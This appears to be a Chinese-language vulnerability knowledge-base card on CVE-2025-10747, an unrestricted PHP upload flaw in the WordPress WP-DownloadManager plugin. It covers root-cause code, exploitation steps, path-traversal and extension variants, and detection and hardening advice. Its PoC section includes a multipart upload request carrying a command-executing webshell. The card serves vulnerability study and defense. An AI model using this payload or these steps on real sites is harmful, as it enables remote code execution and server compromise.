---
id: web-generic-file-upload-wordpress-wp-downloadmanager-addfile-no-extension-check
title: WordPress WP-DownloadManager <=1.68.11 download-add.php 上传无后缀校验：管理员上传 PHP 直接执行（CVE-2025-10747）
type: scenario
domain: web
path: web/generic/file-upload
technique: wp-downloadmanager-addfile-unrestricted-upload
tags:
- wordpress
- php
- plugin
- file-upload
- unrestricted-upload
- webshell
- cve-2025-10747
- authenticated
cve:
- CVE-2025-10747
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: <= 1.68.11
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:01:25+08:00'
  notes: 已对照原文与18张图核对：download-add.php 的 current_user_can('manage_downloads')+check_admin_referer、case1 仅 size/is_uploaded_file 检查后 move_uploaded_file 用原始 basename、case2 仅 parse_url/协议/端口白名单+get_headers 不落盘，均与图08-13一致；上传 phpinfo.php 后访问 /wp-content/files/phpinfo.php 执行，图14-18一致；CVE-2025-10747、<=1.68.11 与图01一致。卡内 HTTP 报文为按字段构造的示例，原文未给完整请求。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-upload/web-generic-file-upload-wordpress-wp-downloadmanager-addfile-no-extension-check/
draft: false
kb_aliases:
- CVE-2025-10747
- WP-DownloadManager 任意文件上传
- download-add.php 上传漏洞
- WordPress 插件任意文件上传
- file_upload 无后缀校验
- move_uploaded_file 原始文件名
---

## 一句话结论

WordPress 插件 WP-DownloadManager <= 1.68.11 的 `download-add.php` 在“上传本地文件”（`file_type=1`）分支只用 `is_uploaded_file` 和大小检查，随后 `move_uploaded_file` 把文件以原始 `basename` 写进 Web 可访问的 `wp-content/files/`，既不校验扩展名也不在落盘前重命名；具备 `manage_downloads` 权限的管理员上传 `.php` 后可直接访问执行，形成 RCE。

## 原理

- **入口与权限**：`download-add.php` 顶部先执行 `if (!current_user_can('manage_downloads')) { die('Access Denied'); }`，随后 `check_admin_referer('wp-downloadmanager_add-file')` 校验 nonce，再按 `$_POST['do']` 和 `$_POST['file_type']` 分发。默认管理员拥有该 capability，因此漏洞要求管理员级（或拥有 `manage_downloads` 的角色）会话，属于“后台管理员 → 服务器 RCE”的权限升级链。
- **三个 file_type 分支**：
  - `case 0`：从服务器已有文件中选择，调用 `download_rename_file` 处理文件名，不接收上传，不构成上传漏洞。
  - `case 1`：上传本地文件，是漏洞点。
  - `case 2`：远程 URL，`is_file_remote_valid` 只校验 `parse_url`、协议白名单（http/https/ftp）与端口白名单（80/443/21），`remote_filesize` 只用 `get_headers` 取 `Content-Length`，文件 URL 仅写入数据库，不下载到服务器，不构成本上传链。
- **case 1 的缺陷代码**：
  ```php
  case 1:
    if ($_FILES['file_upload']['size'] > get_max_upload_size()) { ... break; }
    else {
      if (is_uploaded_file($_FILES['file_upload']['tmp_name'])) {
        $file_upload_to = !empty($_POST['file_upload_to']) ? $_POST['file_upload_to'] : '';
        if ($file_upload_to !== '/') { $file_upload_to = $file_upload_to . '/'; }
        if (move_uploaded_file($_FILES['file_upload']['tmp_name'],
              $file_path . $file_upload_to . basename($_FILES['file_upload']['name']))) {
          $file = $file_upload_to . basename($_FILES['file_upload']['name']);
          $file = download_rename_file($file_path, $file);   // 落盘之后才重命名
          ...
  ```
  - 只检查大小与 `is_uploaded_file`，没有 `pathinfo`/白名单/`wp_check_filetype`；
  - `move_uploaded_file` 使用客户端原始文件名的 `basename()`，扩展名完全可控；
  - `download_rename_file` 在文件已经写入 Web 目录之后才调用，无法阻止执行。
- **为什么能 RCE**：`$file_path` 来自插件配置（默认 `wp-content/files`），该目录位于 Web 根且通常允许 PHP 解析；上传 `phpinfo.php` 或 `shell.php` 后，通过 `/wp-content/files/<name>` 直接访问即由 PHP 执行。数据库只记录文件元数据，不构成访问限制。
- **与普通“后缀白名单弱校验”的区别**：这里根本没有类型校验，任何扩展名（`.php`、`.phtml`、`.phar` 等）都能落盘；文件名本身的 `basename()` 防止了 `../`，但 `file_upload_to` 子目录参数是直接拼接的，未被 `basename` 处理，理论上可尝试跳出 `files` 目录（见变体）。
- **源码之外的门槛**：需要有效管理员会话与 `wp-downloadmanager_add-file` nonce；上传目录必须存在且可写；Web 服务器需允许该目录执行 PHP。

## 触发条件

- WordPress 安装并启用 WP-DownloadManager <= 1.68.11。
- 攻击者拥有管理员账号，或拥有带 `manage_downloads` capability 的角色。
- 插件配置的下载目录（默认 `wp-content/files`）存在、Web 可访问且允许 PHP 执行。
- 能获得 `check_admin_referer` 对应的 nonce（登录后台后从表单获取，或直接通过后台 UI 操作）。

## 利用步骤

1. 以管理员登录 WordPress 后台，进入 `Downloads` → `Add File`。
2. 选择 `Upload File`，选中本地 `phpinfo.php`/`shell.php`，`to` 子目录留空或选默认。
3. 提交后页面提示 `File 'aa (/phpinfo.php)' (ID: 9) Added Successfully`，记录文件名与 ID；也可在 `Manage Downloads` 看到记录。
4. 在文章/小工具/主题中插入下载短代码（如 `[download id="9"]`）或直接按保存路径访问：`http://target/wp-content/files/phpinfo.php`。
5. 确认 PHP 执行（phpinfo 页面或命令回显）；随后可上传功能更完整的 webshell。
6. 若需要脚本化，先登录后台抓取 `download-add.php` 表单的 `_wpnonce`，再构造 multipart POST（见 PoC）。

## PoC

后台 UI 操作（文章实际复现路径）：

```text
登录 wp-admin
→ Downloads → Add File
→ 选择 Upload File，选择 phpinfo.php
→ 提交，得到 File 'aa (/phpinfo.php)' (ID: 9) Added Successfully
→ 访问 http://wp-test.com/wp-content/files/phpinfo.php
→ 返回 PHP Version 7.4.3 信息页，脚本被执行
```

对应的请求结构（端点为插件后台页，`_wpnonce` 需从表单获取）：

```http
POST /wp-admin/admin.php?page=wp-downloadmanager/download-manager.php HTTP/1.1
Host: target
Cookie: wordpress_logged_in_<hash>=<admin-session>
Content-Type: multipart/form-data; boundary=----WPBoundary

------WPBoundary
Content-Disposition: form-data; name="_wpnonce"

<check_admin_referer-nonce>
------WPBoundary
Content-Disposition: form-data; name="do"

Add File
------WPBoundary
Content-Disposition: form-data; name="file_type"

1
------WPBoundary
Content-Disposition: form-data; name="file_upload_to"

/
------WPBoundary
Content-Disposition: form-data; name="file_upload"; filename="shell.php"
Content-Type: application/x-php

<?php echo "pwned"; system($_GET['cmd']); ?>
------WPBoundary--
```

说明：文章未给出完整 HTTP 请求，以上为按 `download-add.php` 字段名与后台表单构造的结构化请求；实际后台页 slug 与 nonce 名称以目标为准。PoC 未在本会话执行。

## 变体与关联

- **子目录穿越**：`file_upload_to` 直接拼接到 `$file_path` 后，未做 `basename`/白名单；可测试 `../../` 等值把文件写到 `wp-content/files` 之外（是否可行取决于目录存在与权限），从而覆盖主题/插件文件。
- **扩展名变体**：无任何过滤，`.php` 最直接；若目标禁用 `.php` 解析，可尝试 `.phtml`、`.php5`、`.phar` 或服务器配置允许的其他可执行后缀。
- **权限变体**：不一定是 `administrator`；任何被授予 `manage_downloads` 的角色都可利用。多站点/角色定制环境下应检查 capability 分配。
- **case 2 的边界**：`get_headers` 会对用户 URL 发起服务端请求，存在受限 SSRF 面（仅 http/https/ftp 与 80/443/21），但只取响应头/Content-Length，文件不落盘且响应不回显完整内容，本卡不将其作为独立场景。
- 关联：[[web-generic-file-upload-extension-zero-check]]（上传扩展名零校验的通用形态）；[[web-generic-file-upload-weak-suffix-bypass]]（仅按后缀弱校验）；[[web-generic-file-upload-move-uploaded-file-trailing-dot]]（`move_uploaded_file` 路径归一化缺陷）。

## 检测与防御

- **升级/补丁**：关注插件更新（文章发布时厂商未提供修复）；如无法升级，按文章建议在 `case 1` 增加上传错误检查、扩展名白名单（jpg/jpeg/png/gif/pdf/doc/docx/xls/xlsx/ppt/pptx/txt/zip/rar）与服务端重命名。
- **部署加固**：在 `wp-content/files/.htaccess` 禁止脚本执行：
  ```apache
  <Files "*.php">
      Order Deny,Allow
      Deny from all
  </Files>
  ```
  或把下载目录移到 Web 根外，由 PHP 代理下载。
- **权限**：只给可信管理员 `manage_downloads`；定期审计角色 capability；限制后台访问来源（IP/VPN/双因素）。
- **检测特征**：`wp-content/files/` 下出现 `.php`/`.phtml`/`.phar` 新文件；后台 `download-add.php` 请求携带可执行扩展名的 `filename`；WordPress 访问日志中出现对 `wp-content/files/*.php` 的直接请求（正常下载通常不会请求 PHP 文件）；插件配置目录被写入脚本。
- **应急**：隔离并删除可疑上传文件；审计管理员账号与登录日志；检查是否已有 webshell 与横向移动痕迹；恢复前先修补插件或加执行禁用规则。
